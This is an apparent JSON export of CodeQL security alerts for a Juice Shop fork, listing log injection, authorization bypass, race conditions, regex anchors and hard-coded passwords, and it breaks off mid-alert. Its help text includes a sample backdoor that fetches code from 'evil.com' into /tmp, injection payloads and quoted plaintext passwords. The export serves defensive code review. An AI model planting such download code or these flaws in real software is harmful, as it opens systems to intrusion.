[{"number":121,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/121","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/121","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/log-injection","severity":"error","description":"Log injection","name":"js/log-injection","tags":["external/cwe/cwe-117","security"],"full_description":"Building log entries from user-controlled sources is vulnerable to insertion of forged log entries by a malicious user.","help":"# Log injection\nIf unsanitized user input is written to a log entry, a malicious user may be able to forge new log entries.\n\nForgery can occur if a user provides some input with characters that are interpreted when the log output is displayed. If the log is displayed as a plain text file, then new line characters can be used by a malicious user. If the log is displayed as HTML, then arbitrary HTML may be included to spoof log entries.\n\n\n## Recommendation\nUser input should be suitably sanitized before it is logged.\n\nIf the log entries are in plain text then line breaks should be removed from user input, using `String.prototype.replace` or similar. Care should also be taken that user input is clearly marked in log entries.\n\nFor log entries that will be displayed in HTML, user input should be HTML-encoded before being logged, to prevent forgery and other forms of HTML injection.\n\n\n## Example\nIn the first example, a username, provided by the user, is logged using \\`console.info\\`. In the first case, it is logged without any sanitization. In the second case, the username is used to build an error that is logged using \\`console.error\\`. If a malicious user provides \\`username=Guest%0a\\[INFO\\]+User:+Admin%0a\\` as a username parameter, the log entry will be splitted in two different lines, where the second line will be \\`\\[INFO\\]+User:+Admin\\`.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    console.info(`[INFO] User: ${q.query.username}`); // BAD: User input logged as-is\n})\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\nIn the second example, `String.prototype.replace` is used to ensure no line endings are present in the user input.\n\n\n```javascript\nconst http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n    let q = url.parse(req.url, true);\n\n    // GOOD: remove newlines from user controlled input before logging\n    let username = q.query.username.replace(/\\n|\\r/g, \"\");\n\n    console.info(`[INFO] User: ${username}`);\n});\n\nserver.listen(3000, '127.0.0.1', () => {});\n\n```\n\n## References\n* OWASP: [Log Injection](https://www.owasp.org/index.php/Log_Injection).\n* Common Weakness Enumeration: [CWE-117](https://cwe.mitre.org/data/definitions/117.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Log entry depends on a user-provided value."},"location":{"path":"lib/challengeUtils.ts","start_line":85,"end_line":85,"start_column":15,"end_column":62},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/121/instances"},{"number":120,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/120","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/120","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/http-to-file-access","severity":"warning","description":"Network data written to file","name":"js/http-to-file-access","tags":["external/cwe/cwe-434","external/cwe/cwe-912","security"],"full_description":"Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.","help":"# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Write to file system depends on Untrusted data."},"location":{"path":"routes/profileImageFileUpload.ts","start_line":31,"end_line":31,"start_column":26,"end_column":32},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/120/instances"},{"number":119,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/119","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/119","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/http-to-file-access","severity":"warning","description":"Network data written to file","name":"js/http-to-file-access","tags":["external/cwe/cwe-434","external/cwe/cwe-912","security"],"full_description":"Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.","help":"# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```javascript\nvar https = require(\"https\");\nvar fs = require(\"fs\");\n\nhttps.get('https://evil.com/script', res => {\n  res.on(\"data\", d => {\n    fs.writeFileSync(\"/tmp/script\", d)\n  })\n});\n\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n","security_severity_level":"medium"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Write to file system depends on Untrusted data."},"location":{"path":"routes/fileUpload.ts","start_line":32,"end_line":32,"start_column":22,"end_column":28},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/119/instances"},{"number":118,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/118","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/118","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/file-system-race","severity":"warning","description":"Potential file system race condition","name":"js/file-system-race","tags":["external/cwe/cwe-367","security"],"full_description":"Separately checking the state of a file before operating on it may allow an attacker to modify the file between the two operations.","help":"# Potential file system race condition\nOften it is necessary to check the state of a file before using it. These checks usually take a file name to be checked, and if the check returns positively, then the file is opened or otherwise operated upon.\n\nHowever, in the time between the check and the operation, the underlying file referenced by the file name could be changed by an attacker, causing unexpected behavior.\n\n\n## Recommendation\nUse file descriptors instead of file names whenever possible.\n\n\n## Example\nThe following example shows a case where the code checks whether a file inside the `/tmp/` folder exists, and if it doesn't, the file is written to that location.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\nif (!fs.existsSync(filePath)) {\n  fs.writeFileSync(filePath, \"Hello\", { mode: 0o600 });\n}\n\n```\nHowever, in a multi-user environment the file might be created by another user between the existence check and the write.\n\nThis can be avoided by using `fs.open` to get a file descriptor, and then use that file descriptor in the write operation.\n\n\n```javascript\nconst fs = require(\"fs\");\nconst os = require(\"os\");\nconst path = require(\"path\");\n\nconst filePath = path.join(os.tmpdir(), \"my-temp-file.txt\");\n\ntry {\n  const fd = fs.openSync(filePath, fs.O_CREAT | fs.O_EXCL | fs.O_RDWR, 0o600);\n\n  fs.writeFileSync(fd, \"Hello\");\n} catch (e) {\n  // file existed\n}\n\n```\n\n## References\n* Wikipedia: [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use).\n* The CERT Oracle Secure Coding Standard for C: [ FIO01-C. Be careful using functions that use file names for identification ](https://www.securecoding.cert.org/confluence/display/c/FIO01-C.+Be+careful+using+functions+that+use+file+names+for+identification).\n* NodeJS: [The FS module](https://nodejs.org/api/fs.html).\n* Common Weakness Enumeration: [CWE-367](https://cwe.mitre.org/data/definitions/367.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"The file may have changed since it was checked."},"location":{"path":"lib/codingChallenges.ts","start_line":29,"end_line":29,"start_column":28,"end_column":57},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/118/instances"},{"number":117,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/117","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/117","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"routes/verify.ts","start_line":113,"end_line":113,"start_column":7,"end_column":12},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/117/instances"},{"number":116,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/116","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/116","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"routes/fileServer.ts","start_line":27,"end_line":27,"start_column":9,"end_column":13},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/116/instances"},{"number":115,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/115","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/115","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"lib/insecurity.ts","start_line":190,"end_line":190,"start_column":7,"end_column":12},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/115/instances"},{"number":114,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/114","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/114","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/user-controlled-bypass","severity":"error","description":"User-controlled bypass of security check","name":"js/user-controlled-bypass","tags":["external/cwe/cwe-290","external/cwe/cwe-807","security"],"full_description":"Conditions that the user controls are not suited for making security-related decisions.","help":"# User-controlled bypass of security check\nUsing user-controlled data in a permissions check may allow a user to gain unauthorized access to protected functionality or data.\n\n\n## Recommendation\nWhen checking whether a user is authorized for a particular activity, do not use data that is entirely controlled by that user in the permissions check. If necessary, always validate the input, ideally against a fixed list of expected values.\n\nSimilarly, do not decide which permission to check for, based on user data. In particular, avoid using computation to decide which permissions to check for. Use fixed permissions for particular actions, rather than generating the permission to check for.\n\n\n## Example\nIn this example, we have a server that shows private information for a user, based on the request parameter `userId`. For privacy reasons, users may only view their own private information, so the server checks that the request parameter `userId` matches a cookie value for the user who is logged in.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.cookies.loggedInUserId !== req.params.userId) {\n        // BAD: login decision made based on user controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\nThis security check is, however, insufficient since an attacker can craft their cookie values to match those of any user. To prevent this, the server can cryptographically sign the security critical cookie values:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n// ...\napp.get('/full-profile/:userId', function(req, res) {\n\n    if (req.signedCookies.loggedInUserId !== req.params.userId) {\n        // GOOD: login decision made based on server controlled data\n        requireLogin();\n    } else {\n        // ... show private information\n    }\n\n});\n\n```\n\n## References\n* Common Weakness Enumeration: [CWE-807](https://cwe.mitre.org/data/definitions/807.html).\n* Common Weakness Enumeration: [CWE-290](https://cwe.mitre.org/data/definitions/290.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it.\nThis condition guards a sensitive action, but a user-provided value controls it."},"location":{"path":"lib/insecurity.ts","start_line":57,"end_line":57,"start_column":42,"end_column":47},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/114/instances"},{"number":113,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/113","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/113","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/regex/missing-regexp-anchor","severity":"warning","description":"Missing regular expression anchor","name":"js/regex/missing-regexp-anchor","tags":["correctness","external/cwe/cwe-020","security"],"full_description":"Regular expressions without anchors can be vulnerable to bypassing.","help":"# Missing regular expression anchor\nSanitizing untrusted input with regular expressions is a common technique. However, it is error-prone to match untrusted input against regular expressions without anchors such as `^` or `$`. Malicious input can bypass such security checks by embedding one of the allowed patterns in an unexpected location.\n\nEven if the matching is not done in a security-critical context, it may still cause undesirable behavior when the regular expression accidentally matches.\n\n\n## Recommendation\nUse anchors to ensure that regular expressions match at the expected locations.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.match(/https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nThe check with the regular expression match is, however, easy to bypass. For example by embedding `http://example.com/` in the query string component: `http://evil-example.net/?x=http://example.com/`. Address these shortcomings by using anchors in the regular expression instead:\n\n\n```javascript\napp.get(\"/some/path\", function(req, res) {\n    let url = req.param(\"url\");\n    // GOOD: the host of `url` can not be controlled by an attacker\n    if (url.match(/^https?:\\/\\/www\\.example\\.com\\//)) {\n        res.redirect(url);\n    }\n});\n\n```\nA related mistake is to write a regular expression with multiple alternatives, but to only include an anchor for one of the alternatives. As an example, the regular expression `/^www\\.example\\.com|beta\\.example\\.com/` will match the host `evil.beta.example.com` because the regular expression is parsed as `/(^www\\.example\\.com)|(beta\\.example\\.com)/`\n\n\n## References\n* MDN: [Regular Expressions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Regular_Expressions)\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"When this is used as a regular expression on a URL, it may match anywhere, and arbitrary hosts may come before or after it."},"location":{"path":"test/cypress/e2e/redirect.spec.ts","start_line":19,"end_line":19,"start_column":32,"end_column":54},"classifications":["test"]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/113/instances"},{"number":112,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/112","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/112","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'private' in configuration file."},"location":{"path":"data/static/users.yml","start_line":259,"end_line":259,"start_column":13,"end_column":22},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/112/instances"},{"number":111,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/111","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/111","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 'ship coffin krypt cross estate supply insurance asbestos souvenir' in configuration file."},"location":{"path":"data/static/users.yml","start_line":249,"end_line":249,"start_column":13,"end_column":80},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/111/instances"},{"number":110,"created_at":"2025-01-27T04:23:21Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/110","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/110","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/password-in-configuration-file","severity":"warning","description":"Password in configuration file","name":"js/password-in-configuration-file","tags":["external/cwe/cwe-256","external/cwe/cwe-260","external/cwe/cwe-313","external/cwe/cwe-522","security"],"full_description":"Storing unencrypted passwords in configuration files is unsafe.","help":"# Password in configuration file\nStoring a plaintext password in a configuration file allows anyone who can read the file to access the password-protected resources. Therefore it is a common attack vector.\n\n\n## Recommendation\nPasswords stored in configuration files should always be encrypted.\n\n\n## References\n* Common Weakness Enumeration: [CWE-256](https://cwe.mitre.org/data/definitions/256.html).\n* Common Weakness Enumeration: [CWE-260](https://cwe.mitre.org/data/definitions/260.html).\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n* Common Weakness Enumeration: [CWE-522](https://cwe.mitre.org/data/definitions/522.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.3"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql-analysis.yml:analyze","environment":"{\"language\":\"javascript-typescript\"}","category":".github/workflows/codeql-analysis.yml:analyze/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Hard-coded password 